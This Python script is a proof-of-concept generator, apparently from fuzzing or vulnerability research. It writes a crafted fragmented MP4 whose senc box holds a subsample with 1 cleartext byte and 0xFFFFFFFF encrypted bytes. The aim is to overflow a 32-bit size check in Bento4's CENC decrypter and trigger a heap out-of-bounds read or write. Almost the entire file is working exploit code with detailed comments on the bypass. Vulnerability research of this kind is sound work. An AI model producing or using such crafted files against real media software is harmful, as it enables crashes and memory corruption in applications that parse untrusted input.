#!/usr/bin/env python3
"""
VULN-002 PoC Generator
======================
Vulnerability: Integer Overflow in AP4_CencSingleSampleDecrypter::DecryptSampleData
File: Bento4/Source/C++/Core/Ap4CommonEncryption.cpp, line 1893

The bug:
    cleartext_size (AP4_UI16, max 65535) + encrypted_size (AP4_UI32)
    With cleartext_size=1 and encrypted_size=0xFFFFFFFF:
        1 + 0xFFFFFFFF = 0x100000000 -> truncates to 0 in 32-bit unsigned
    The check: (unsigned int)(in_end-in) < 0 is ALWAYS false -> bypass!
    Then ProcessBuffer is called with size=0xFFFFFFFF, causing heap OOB read/write.

This script constructs a fragmented CENC-encrypted MP4 with:
  - ftyp + moov (with enca sample entry, sinf/tenc for cenc scheme)
  - moof + mdat (with senc box containing the overflow-triggering subsample entry)

The senc box has:
  - flags=0x02 (UseSubSampleEncryptionMap)
  - sample_count=1
  - 1 subsample: bytes_of_cleartext_data=1 (UI16), bytes_of_encrypted_data=0xFFFFFFFF (UI32)

Note: mp42aac uses AP4_SampleDecrypter::Create(pdesc, key, 16) which does NOT handle
the cenc scheme (only OMA/IAEC), so returns NULL. The vulnerable DecryptSampleData
is therefore not reached via mp42aac. The PoC demonstrates the data payload that
would trigger the crash in tools/code paths that use the traf-aware Create overload.
"""

import struct
import os

OUTPUT_DIR = "/data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4CommonEncryption_cpp"
OUTPUT_FILE = os.path.join(OUTPUT_DIR, "vuln_002.mp4")


def box(type4, content):
    """Build a standard ISO BMFF box: size(4BE) + type(4) + content"""
    if isinstance(type4, str):
        type4 = type4.encode('ascii')
    size = 8 + len(content)
    return struct.pack('>I', size) + type4 + content


def fullbox(type4, version, flags, content):
    """Build a FullBox: box header + version(1) + flags(3) + content"""
    ver_flags = ((version & 0xFF) << 24) | (flags & 0xFFFFFF)
    return box(type4, struct.pack('>I', ver_flags) + content)


# Standard 3D identity matrix for video/transform boxes
IDENTITY_MATRIX = struct.pack('>9i',
    0x00010000, 0, 0,
    0, 0x00010000, 0,
    0, 0, 0x40000000
)

# ===========================================================================
# ftyp box
# ===========================================================================
ftyp = box('ftyp',
    b'iso5'                  # major_brand
    + struct.pack('>I', 1)   # minor_version
    + b'iso5'                # compatible_brands
    + b'dash'
    + b'iso6'
)

# ===========================================================================
# moov: mvhd + trak + mvex
# ===========================================================================

# mvhd (version=0)
mvhd_data = (
    struct.pack('>IIIII', 0, 0, 1000, 0, 0x00010000)  # create,mod,timescale,duration,rate
    + struct.pack('>H', 0x0100)  # volume = 1.0
    + b'\x00' * 10              # reserved
    + IDENTITY_MATRIX           # matrix (36 bytes)
    + b'\x00' * 24             # pre_defined (6 x int32)
    + struct.pack('>I', 2)     # next_track_ID
)
mvhd = fullbox('mvhd', 0, 0, mvhd_data)

# --- Build trak ---

# tkhd (version=0, flags=3: enabled + in_movie)
tkhd_data = (
    struct.pack('>IIIII', 0, 0, 1, 0, 0)  # create, mod, track_ID=1, reserved, duration=0
    + b'\x00' * 8                          # reserved
    + struct.pack('>HHH', 0, 0, 0x0100)   # layer, alternate_group, volume=1.0
    + struct.pack('>H', 0)                 # reserved
    + IDENTITY_MATRIX                      # matrix
    + struct.pack('>II', 0, 0)            # width=0, height=0 (audio)
)
tkhd = fullbox('tkhd', 0, 3, tkhd_data)

# mdhd (version=0)
# language 'und': u=0x15, n=0x0E, d=0x04 -> packed 16-bit: 0x55C4
mdhd_data = (
    struct.pack('>IIII', 0, 0, 44100, 0)  # create, mod, timescale=44100, duration=0
    + struct.pack('>HH', 0x55C4, 0)       # language='und', pre_defined=0
)
mdhd = fullbox('mdhd', 0, 0, mdhd_data)

# hdlr (handler_type='soun' for audio)
hdlr_data = (
    struct.pack('>I', 0)   # pre_defined
    + b'soun'              # handler_type
    + b'\x00' * 12         # reserved
    + b'SoundHandler\x00'  # name (null-terminated)
)
hdlr = fullbox('hdlr', 0, 0, hdlr_data)

# tenc (Track Encryption Box, version=0)
# Specifies default encryption parameters for the track
tenc_data = (
    struct.pack('>H', 0)   # reserved
    + struct.pack('>B', 1) # default_isEncrypted = 1
    + struct.pack('>B', 16)  # default_IV_size = 16 bytes
    + b'\x00' * 16         # default_KID (all zeros)
)
tenc = fullbox('tenc', 0, 0, tenc_data)

# sinf: frma + schm + schi(tenc)
frma = box('frma', b'mp4a')   # original format = mp4a (AAC)
schm = fullbox('schm', 0, 0,
    b'cenc'                             # scheme_type = CENC
    + struct.pack('>I', 0x00010000)     # scheme_version = 1.0
)
schi = box('schi', tenc)
sinf = box('sinf', frma + schm + schi)

# enca sample entry (Encrypted Audio)
# AudioSampleEntry fields:
#   reserved(6) + data_reference_index(2) + reserved[2](8) +
#   channelcount(2) + samplesize(2) + pre_defined(2) + reserved(2) + samplerate(4)
enca_audio_header = (
    b'\x00' * 6                           # reserved
    + struct.pack('>H', 1)                # data_reference_index = 1
    + b'\x00' * 8                         # reserved[2]
    + struct.pack('>HH', 2, 16)           # channelcount=2, samplesize=16
    + struct.pack('>HH', 0, 0)            # pre_defined=0, reserved=0
    + struct.pack('>I', 44100 << 16)      # samplerate = 44100.0 (fixed-point 16.16)
)
enca = box('enca', enca_audio_header + sinf)

# stsd: sample description box (1 entry: enca)
stsd = fullbox('stsd', 0, 0, struct.pack('>I', 1) + enca)

# stts, stsc, stco, stsz: all empty (fragmented MP4 - samples in moof/mdat)
stts = fullbox('stts', 0, 0, struct.pack('>I', 0))    # entry_count=0
stsc = fullbox('stsc', 0, 0, struct.pack('>I', 0))    # entry_count=0
stco = fullbox('stco', 0, 0, struct.pack('>I', 0))    # entry_count=0
stsz = fullbox('stsz', 0, 0, struct.pack('>II', 0, 0))  # sample_size=0, sample_count=0

# stbl: Sample Table Box
stbl = box('stbl', stsd + stts + stsc + stco + stsz)

# minf: Media Information Box
smhd = fullbox('smhd', 0, 0, struct.pack('>HH', 0, 0))  # balance=0, reserved=0
url_entry = fullbox('url ', 0, 1, b'')                    # self-contained (flags=1)
dref = fullbox('dref', 0, 0, struct.pack('>I', 1) + url_entry)
dinf = box('dinf', dref)
minf = box('minf', smhd + dinf + stbl)

# mdia + trak
mdia = box('mdia', mdhd + hdlr + minf)
trak = box('trak', tkhd + mdia)

# trex: Track Fragment Defaults (required for fragmented MP4)
trex = fullbox('trex', 0, 0,
    struct.pack('>IIIII',
        1,  # track_ID
        1,  # default_sample_description_index
        0,  # default_sample_duration
        0,  # default_sample_size
        0,  # default_sample_flags
    )
)
mvex = box('mvex', trex)

# Assemble moov
moov = box('moov', mvhd + trak + mvex)

# ===========================================================================
# moof + mdat (fragment containing the malicious sample)
# ===========================================================================

# mfhd: Movie Fragment Header
mfhd = fullbox('mfhd', 0, 0, struct.pack('>I', 1))  # sequence_number=1

# tfhd: Track Fragment Header
# flags=0x020000: default-base-is-moof (base_data_offset = start of moof)
tfhd = fullbox('tfhd', 0, 0x020000, struct.pack('>I', 1))  # track_ID=1

# senc: Sample Encryption Box (*** THE VULNERABILITY TRIGGER ***)
# flags=0x02: UseSubSampleEncryptionMap
# sample_count=1
# Sample 0:
#   IV = 16 bytes of zeros
#   subsample_count = 1
#   bytes_of_cleartext_data = 1   (AP4_UI16 = max 65535)
#   bytes_of_encrypted_data = 0xFFFFFFFF (AP4_UI32 = ~4GB)
#
# At line 1893 in DecryptSampleData:
#   (unsigned int)(in_end-in) < cleartext_size + encrypted_size
#   = any_positive < (1 + 0xFFFFFFFF)
#   = any_positive < 0x100000000   <- 32-bit overflow! truncates to 0
#   = any_positive < 0             <- ALWAYS FALSE -> bounds check bypassed!
# Then ProcessBuffer is called with size=0xFFFFFFFF causing heap OOB.
senc_payload = (
    struct.pack('>I', 1)           # sample_count = 1
    + b'\x00' * 16                 # IV (16 bytes of zeros)
    + struct.pack('>H', 1)         # subsample_count = 1
    + struct.pack('>H', 1)         # bytes_of_cleartext_data = 1 (AP4_UI16)  <-- OVERFLOW OPERAND
    + struct.pack('>I', 0xFFFFFFFF)  # bytes_of_encrypted_data = 0xFFFFFFFF (AP4_UI32)  <-- OVERFLOW OPERAND
)
senc = fullbox('senc', 0, 0x000002, senc_payload)

# Pre-calculate moof size to determine data_offset for trun:
#   mfhd:  12 (header+ver_flags) + 4  = 16 bytes
#   tfhd:  12 + 4 = 16 bytes
#   senc:  12 + len(senc_payload) = 12 + 28 = 40 bytes
#   trun:  12 + 12 (count + data_offset + sample_size) = 24 bytes
#   traf:  8 + (16 + 24 + 40) = 88 bytes
#   moof:  8 + (16 + 88) = 112 bytes
#   data_offset = moof_size + 8 (mdat header) = 120
MOOF_SIZE = 112
data_offset = MOOF_SIZE + 8  # = 120

# trun: Track Run (1 sample of 4 bytes)
# flags=0x201: data_offset_present(0x001) | sample_size_present(0x200)
trun = fullbox('trun', 0, 0x000201,
    struct.pack('>I', 1)        # sample_count = 1
    + struct.pack('>i', data_offset)  # data_offset = 120 (signed, from start of moof)
    + struct.pack('>I', 4)      # sample 0: size = 4 bytes
)

# Validate expected sizes
assert len(mfhd) == 16, f"mfhd={len(mfhd)}"
assert len(tfhd) == 16, f"tfhd={len(tfhd)}"
assert len(trun) == 24, f"trun={len(trun)}"
assert len(senc) == 40, f"senc={len(senc)}"

traf = box('traf', tfhd + trun + senc)
assert len(traf) == 88, f"traf={len(traf)}"

moof = box('moof', mfhd + traf)
assert len(moof) == MOOF_SIZE, f"moof={len(moof)}"

# mdat: 4 bytes of sample data (matches sample_size=4 in trun)
# When DecryptSampleData processes this:
#   in_end - in = 4
#   cleartext_size=1, encrypted_size=0xFFFFFFFF
#   After overflow: check "4 < 0" -> false -> bypass
#   ProcessBuffer(in+1, 0xFFFFFFFF, out+1, ...) -> HEAP OOB READ (reads 4GB from 3-byte buffer)
mdat = box('mdat', b'\xDE\xAD\xBE\xEF')

# ===========================================================================
# Write the MP4 file
# ===========================================================================
os.makedirs(OUTPUT_DIR, exist_ok=True)
mp4_data = ftyp + moov + moof + mdat

with open(OUTPUT_FILE, 'wb') as f:
    f.write(mp4_data)

print(f"[+] Written {len(mp4_data)} bytes to {OUTPUT_FILE}")
print(f"[+] MP4 structure: ftyp({len(ftyp)}) + moov({len(moov)}) + moof({len(moof)}) + mdat({len(mdat)})")
print(f"[+] senc subsample: cleartext=1, encrypted=0xFFFFFFFF")
print(f"[+] Overflow: 1 + 0xFFFFFFFF = 0x100000000 -> truncates to 0 (32-bit)")
print(f"[+] Bounds check bypassed: any_positive < 0 is always false")
